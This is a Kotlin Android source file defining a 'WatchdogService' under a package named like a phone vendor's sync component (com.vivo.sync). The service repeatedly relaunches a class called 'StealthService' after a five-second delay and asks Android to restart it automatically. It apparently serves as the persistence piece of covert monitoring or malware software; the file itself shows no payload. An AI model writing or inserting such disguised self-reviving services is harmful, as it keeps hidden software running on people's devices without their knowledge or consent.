package com.vivo.sync
import android.app.Service
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper

class WatchdogService : Service() {
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Handler(Looper.getMainLooper()).postDelayed({ startService(Intent(this, StealthService::class.java)); stopSelf() },5000)
        return START_STICKY
    }
    override fun onBind(intent: Intent?): IBinder? = null
}